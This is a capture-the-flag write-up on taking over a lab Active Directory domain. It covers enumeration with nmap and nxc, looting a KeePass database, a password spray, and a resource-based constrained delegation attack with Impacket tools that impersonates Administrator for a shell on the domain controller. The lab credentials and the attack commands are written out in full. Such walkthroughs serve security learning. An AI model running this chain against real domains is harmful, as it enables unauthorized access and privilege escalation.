## Forward

Our goal is to navigate through a compromised Active Directory environment, move laterally through the domain, and gain Administrator privileges in order to retrieve a flag.

Start with an nmap scan on the target.
```
nmap -sC -sV -p- 10.64.167.135 --min-rate 1000
```
<img width="1920" height="1140" alt="Screenshot 2026-07-01 130226" src="https://github.com/user-attachments/assets/4ae20da4-88c5-46b8-9ae2-55048b1a98e7" />

We were supplied a set of credentials as part of the room briefing. We can use those credentials to get into the SMB share. We can start by enumerating the shares.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 130635" src="https://github.com/user-attachments/assets/d8347037-dd67-4ab8-919c-0a1e5597a1e1" />

We can then generate a hosts file, and add the contents of that file to /etc/hosts.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 130904" src="https://github.com/user-attachments/assets/2a660283-b0ea-4aeb-b41c-b77fc5b553a6" />

Next, we can enumerate the users on the machine to give us a bit more info.
```
nxc smb 10.64.167.135 -u 'ctf.local\j.smith' -p 'JSmith@IT2024' --rid-brute
```
<img width="1920" height="1140" alt="Screenshot 2026-07-01 131221" src="https://github.com/user-attachments/assets/2570f774-1b0a-4221-ac07-344d30c25a84" />

Now that we have a bit more of an idea about the target machine and what we are working with, we can jump right in. RDP into the target machine.
```
xfreerdp /v:10.64.167.135 /u:j.smith /p:JSmith@IT2024
```
Through a bit of digging around, we find a file of potential interest.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 131712" src="https://github.com/user-attachments/assets/c29545a3-3a2f-4012-9076-8998d3a6328f" />

It seems this is a KeePass Password Database file. We don't have access to the master password, but it turns out we can gain access by using the Windows user account instead of a master password. We find 3 passwords in the file, and one of them appears to be credentials for an account called t.jones. We can copy-paste it within a 12-second window and get the password.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 135005 (Redacted)" src="https://github.com/user-attachments/assets/4578638f-d164-4b15-aeb6-43dffb0f8c85" />

We now have access to the share with these new credentials. We can start by authenticating into the shares as t.jones.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 135603 (Redacted)" src="https://github.com/user-attachments/assets/1b1642bb-f392-4436-b422-d9f41197c8bb" />

Unfortunately, it doesn't seem like we gained anything with this account in terms of the shares, and it seems like this user has nothing of interest on their workspace either. There are two other passwords in that .kdbx file we were looking at earlier though, so a password spray attack is a potential path forward. Earlier, we enumerated the users on the network, and now we have a few passwords we can try. Put all of those users into a text file, which I named users.txt, and put the passwords into another text file, which I named passwords.txt.
```
nxc smb 10.64.167.135 -u users.txt -p passwords.txt --continue-on-success
```
<img width="1920" height="1140" alt="Screenshot 2026-07-01 140713 (Redacted)" src="https://github.com/user-attachments/assets/d61cd435-5fc5-4a70-b419-7643b165e3c2" />

We have found another set of credentials that works! Running BloodHound, we find that r.williams has Outbound Object Control on DC01.CTF.LOCAL. Follow the instructions given by BloodHound and we can do a Pass-the-Ticket attack.
```
addcomputer.py -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Password123!' -dc-host DC01 -domain-netbios ctf.local 'ctf.local/r.williams:REDACTED'

rbcd.py -dc-ip 10.64.167.135 -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:REDACTED'

echo "10.64.167.135 DC01.ctf.local ctf.local" | sudo tee -a /etc/hosts

getST.py -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Password123!'

export KRB5CCNAME=Administrator.ccache

smbexec.py -k -no-pass ctf.local/Administrator@DC01.ctf.local
```
At this point, we now have a semi-interactive shell. We can get the flag from here.
<img width="1920" height="1140" alt="Screenshot 2026-07-01 145733 (Redacted)" src="https://github.com/user-attachments/assets/425945dc-ecdc-48b7-a6d4-1e5b16e63d23" />
